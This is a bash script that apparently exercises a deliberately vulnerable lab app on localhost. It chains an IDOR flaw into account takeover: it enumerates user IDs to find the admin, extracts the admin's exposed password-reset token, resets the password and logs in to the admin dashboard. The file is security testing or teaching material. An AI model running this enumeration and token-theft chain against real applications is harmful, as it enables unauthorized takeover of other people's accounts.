#!/bin/bash
# Chain 2: IDOR → Account Takeover
# Register → discover IDOR → enumerate 30 users to find admin at ID 23 → reset → login

BASE="http://localhost:8888"
LOG="test_logs/chain2_idor.log"
> "$LOG"

echo "=== Chain 2: IDOR to Account Takeover ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Register attacker account
echo "--- Step 1: Register attacker account ---" | tee -a "$LOG"
curl -s -X POST "$BASE/chains/idor/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"pass123"}' | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 2: View own profile, notice reset_token field is exposed
echo "--- Step 2: View own profile (notice reset_token is exposed) ---" | tee -a "$LOG"
curl -s "$BASE/chains/idor/users/200" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 3: Enumerate user IDs 1-30 looking for admin
echo "--- Step 3: Enumerate user IDs 1-30 (IDOR scan) ---" | tee -a "$LOG"
ADMIN_ID=""
for id in $(seq 1 30); do
  RESP=$(curl -s "$BASE/chains/idor/users/$id")
  ROLE=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('role',''))" 2>/dev/null)
  EMAIL=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('email',''))" 2>/dev/null)
  echo "  ID $id: role=$ROLE email=$EMAIL" | tee -a "$LOG"
  if [ "$ROLE" = "admin" ]; then
    ADMIN_ID=$id
    echo "  ** FOUND ADMIN at ID $id **" | tee -a "$LOG"
  fi
done
echo "" | tee -a "$LOG"

if [ -z "$ADMIN_ID" ]; then
  echo "  Admin not found in IDs 1-30, extending search..." | tee -a "$LOG"
  exit 1
fi

# Step 4: Extract admin's reset token
echo "--- Step 4: Extract admin reset token from user $ADMIN_ID ---" | tee -a "$LOG"
RESET_TOKEN=$(curl -s "$BASE/chains/idor/users/$ADMIN_ID" | python3 -c "import sys,json; print(json.load(sys.stdin)['password_reset_token'])")
echo "Admin reset token: $RESET_TOKEN" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 5: Reset admin password using stolen token
echo "--- Step 5: Reset admin password with stolen token ---" | tee -a "$LOG"
curl -s -X POST "$BASE/chains/idor/reset-password" \
  -H "Content-Type: application/json" \
  -d "{\"reset_token\":\"$RESET_TOKEN\",\"new_password\":\"hacked123\"}" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 6: Login as admin with new password
echo "--- Step 6: Login as admin ---" | tee -a "$LOG"
ADMIN_RESPONSE=$(curl -s -X POST "$BASE/chains/idor/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"sysop@vehitrack.internal","password":"hacked123"}')
echo "$ADMIN_RESPONSE" | tee -a "$LOG"
echo "" | tee -a "$LOG"

ADMIN_TOKEN=$(echo "$ADMIN_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "--- Step 6b: Access admin dashboard ---" | tee -a "$LOG"
curl -s "$BASE/chains/idor/admin/dashboard?token=$ADMIN_TOKEN" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

echo "=== Chain 2 Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
